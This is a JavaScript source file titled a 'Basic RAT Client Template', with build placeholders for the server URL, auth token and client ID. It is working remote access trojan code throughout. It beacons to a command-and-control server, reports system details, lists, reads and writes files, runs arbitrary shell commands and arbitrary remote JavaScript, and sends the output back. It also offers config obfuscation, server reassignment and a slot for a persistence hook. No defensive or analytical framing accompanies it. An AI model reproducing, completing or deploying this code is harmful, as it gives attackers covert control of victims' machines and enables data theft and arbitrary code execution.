// Basic RAT Client Template
// Generated: __BUILD_TIME__
// Client ID: __CLIENT_ID__

(function() {
    'use strict';
    
    // Configuration
    const CONFIG = {
        serverUrl: '__SERVER_URL__',
        authToken: '__AUTH_TOKEN__',
        clientId: '__CLIENT_ID__',
        heartbeatInterval: 5000,
        maxRetries: 3,
        retryDelay: 10000
    };

    // State
    let isRunning = true;
    let retryCount = 0;
    let lastCommandId = null;

    // Utilities
    const Utils = {
        decode: __OBFUSCATE__ ? (str) => atob(str) : (str) => str,
        generateId: () => Math.random().toString(36).substr(2, 9),
        sleep: (ms) => new Promise(resolve => setTimeout(resolve, ms)),
        
        async httpRequest(url, options = {}) {
            const defaultOptions = {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Client-ID': CONFIG.clientId,
                    'Authorization': `Bearer ${CONFIG.authToken}`
                }
            };

            const finalOptions = { ...defaultOptions, ...options };

            try {
                const response = await fetch(url, finalOptions);
                return await response.json();
            } catch (error) {
                throw new Error(`HTTP request failed: ${error.message}`);
            }
        },

        getSystemInfo() {
            const info = {
                platform: typeof navigator !== 'undefined' ? navigator.platform : process.platform,
                userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Node.js',
                language: typeof navigator !== 'undefined' ? navigator.language : 'en',
                timestamp: Date.now(),
                clientId: CONFIG.clientId
            };

            if (typeof process !== 'undefined') {
                // Node.js environment
                info.nodeVersion = process.version;
                info.arch = process.arch;
                info.pid = process.pid;
                info.cwd = process.cwd();
            }

            return info;
        },

        async executeCommand(command, parameters = {}) {
            console.log(`[RAT] Executing: ${command}`);
            
            let result = null;
            let error = null;

            try {
                switch (command) {
                    case 'system_info':
                        result = Utils.getSystemInfo();
                        break;

                    case 'ping':
                        result = { 
                            pong: Date.now(), 
                            clientId: CONFIG.clientId,
                            uptime: typeof process !== 'undefined' ? process.uptime() : 0
                        };
                        break;

                    case 'screenshot':
                        if (typeof navigator !== 'undefined') {
                            // Browser environment - use html2canvas if available
                            result = { 
                                status: 'screenshot_requested',
                                note: 'Screenshot capture requires additional libraries'
                            };
                        } else {
                            // Node.js environment - use screenshot libraries
                            result = { 
                                status: 'screenshot_requested',
                                note: 'Screenshot capture requires additional libraries'
                            };
                        }
                        break;

                    case 'file_list':
                        if (typeof process !== 'undefined') {
                            const fs = require('fs');
                            const path = require('path');
                            const dir = parameters.path || process.cwd();
                            
                            try {
                                const files = fs.readdirSync(dir);
                                result = { 
                                    directory: dir,
                                    files: files.map(file => {
                                        const filePath = path.join(dir, file);
                                        const stats = fs.statSync(filePath);
                                        return {
                                            name: file,
                                            size: stats.size,
                                            isDirectory: stats.isDirectory(),
                                            modified: stats.mtime
                                        };
                                    })
                                };
                            } catch (e) {
                                error = `Failed to list directory: ${e.message}`;
                            }
                        } else {
                            error = 'File operations not supported in browser';
                        }
                        break;

                    case 'file_read':
                        if (typeof process !== 'undefined') {
                            const fs = require('fs');
                            try {
                                const content = fs.readFileSync(parameters.path, 'utf8');
                                result = { 
                                    path: parameters.path,
                                    content: content,
                                    size: content.length
                                };
                            } catch (e) {
                                error = `Failed to read file: ${e.message}`;
                            }
                        } else {
                            error = 'File operations not supported in browser';
                        }
                        break;

                    case 'file_write':
                        if (typeof process !== 'undefined') {
                            const fs = require('fs');
                            try {
                                fs.writeFileSync(parameters.path, parameters.content, 'utf8');
                                result = { 
                                    path: parameters.path,
                                    status: 'written',
                                    size: parameters.content.length
                                };
                            } catch (e) {
                                error = `Failed to write file: ${e.message}`;
                            }
                        } else {
                            error = 'File operations not supported in browser';
                        }
                        break;

                    case 'shell':
                        if (typeof process !== 'undefined') {
                            const { execSync } = require('child_process');
                            try {
                                const output = execSync(parameters.command, { 
                                    encoding: 'utf8',
                                    timeout: 30000
                                });
                                result = {
                                    command: parameters.command,
                                    output: output,
                                    exitCode: 0
                                };
                            } catch (e) {
                                result = {
                                    command: parameters.command,
                                    output: e.stdout || '',
                                    error: e.stderr || e.message,
                                    exitCode: e.status || 1
                                };
                            }
                        } else {
                            error = 'Shell commands not supported in browser';
                        }
                        break;

                    case 'custom_script':
                        if (parameters.code) {
                            try {
                                // Execute custom JavaScript in a controlled manner
                                const func = new Function('params', parameters.code);
                                result = func(parameters);
                            } catch (e) {
                                error = `Script execution failed: ${e.message}`;
                            }
                        } else {
                            error = 'No code provided';
                        }
                        break;

                    case 'update_config':
                        if (parameters.serverUrl) CONFIG.serverUrl = parameters.serverUrl;
                        if (parameters.authToken) CONFIG.authToken = parameters.authToken;
                        if (parameters.heartbeatInterval) CONFIG.heartbeatInterval = parameters.heartbeatInterval;
                        
                        result = { 
                            status: 'config_updated',
                            newConfig: CONFIG
                        };
                        break;

                    case 'shutdown':
                        result = { status: 'shutting_down' };
                        isRunning = false;
                        break;

                    default:
                        error = `Unknown command: ${command}`;
                }
            } catch (e) {
                error = `Command execution failed: ${e.message}`;
            }

            return { result, error, commandId: lastCommandId };
        },

        async sendResponse(responseData) {
            try {
                const response = await Utils.httpRequest(
                    `${CONFIG.serverUrl}/.netlify/functions/response`,
                    {
                        method: 'POST',
                        body: JSON.stringify(responseData)
                    }
                );
                console.log('[RAT] Response sent successfully');
                return response;
            } catch (error) {
                console.error('[RAT] Failed to send response:', error.message);
                throw error;
            }
        },

        async heartbeat() {
            try {
                const response = await Utils.httpRequest(
                    `${CONFIG.serverUrl}/.netlify/functions/heartbeat`
                );

                if (response.status === 'command_pending') {
                    console.log('[RAT] Received command:', response.command);
                    lastCommandId = response.command.id;
                    
                    const result = await Utils.executeCommand(
                        response.command.command, 
                        response.command.parameters
                    );
                    
                    await Utils.sendResponse(result);
                } else {
                    console.log('[RAT] Heartbeat acknowledged');
                }

                retryCount = 0; // Reset retry count on success
                return response;
            } catch (error) {
                console.error('[RAT] Heartbeat failed:', error.message);
                retryCount++;
                
                if (retryCount >= CONFIG.maxRetries) {
                    console.error('[RAT] Max retries reached, stopping');
                    isRunning = false;
                }
                
                throw error;
            }
        }
    };

    // Persistence hook
    // __PERSISTENCE_HOOK__

    // Main execution loop
    async function start() {
        console.log(`[RAT] Client starting...`);
        console.log(`[RAT] Client ID: ${CONFIG.clientId}`);
        console.log(`[RAT] Server: ${CONFIG.serverUrl}`);
        
        // Decode configuration if obfuscated
        if (__OBFUSCATE__) {
            CONFIG.serverUrl = Utils.decode(CONFIG.serverUrl);
            CONFIG.authToken = Utils.decode(CONFIG.authToken);
        }

        while (isRunning) {
            try {
                await Utils.heartbeat();
                await Utils.sleep(CONFIG.heartbeatInterval);
            } catch (error) {
                console.error('[RAT] Main loop error:', error.message);
                await Utils.sleep(CONFIG.retryDelay);
            }
        }

        console.log('[RAT] Client stopped');
    }

    // Error handling
    if (typeof process !== 'undefined') {
        process.on('uncaughtException', (error) => {
            console.error('[RAT] Uncaught exception:', error);
        });

        process.on('unhandledRejection', (reason, promise) => {
            console.error('[RAT] Unhandled rejection at:', promise, 'reason:', reason);
        });

        // Graceful shutdown
        process.on('SIGINT', () => {
            console.log('[RAT] Received SIGINT, shutting down...');
            isRunning = false;
        });

        process.on('SIGTERM', () => {
            console.log('[RAT] Received SIGTERM, shutting down...');
            isRunning = false;
        });
    }

    // Start the client
    if (typeof module === 'undefined') {
        // Browser environment
        start();
    } else {
        // Node.js environment
        start();
    }
})();
